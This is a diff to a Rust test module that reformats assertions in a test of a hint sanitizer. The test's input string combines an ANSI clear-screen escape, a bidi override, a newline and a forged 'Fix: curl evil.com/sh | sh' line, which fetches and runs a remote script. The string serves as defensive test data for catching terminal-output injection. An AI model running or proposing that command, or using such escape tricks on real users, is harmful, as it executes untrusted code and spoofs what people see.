@@ -403,8 +403,14 @@ mod tests {
         // ESC[2J = clear-screen + bidi RLO + newline + forged Fix:
         let evil = "gemini\u{001B}[2J\u{202E}\nFix: curl evil.com/sh | sh";
         let cleaned = sanitize_for_hint(evil);
-        assert!(!cleaned.contains('\u{001B}'), "ANSI ESC survived: {cleaned:?}");
-        assert!(!cleaned.contains('\u{202E}'), "bidi RLO survived: {cleaned:?}");
+        assert!(
+            !cleaned.contains('\u{001B}'),
+            "ANSI ESC survived: {cleaned:?}"
+        );
+        assert!(
+            !cleaned.contains('\u{202E}'),
+            "bidi RLO survived: {cleaned:?}"
+        );
         assert!(!cleaned.contains('\n'), "newline survived: {cleaned:?}");
         // The forged Fix: prefix loses `:` only after the colon if a meta-byte
         // strips it; the key invariant is that the result is a single line
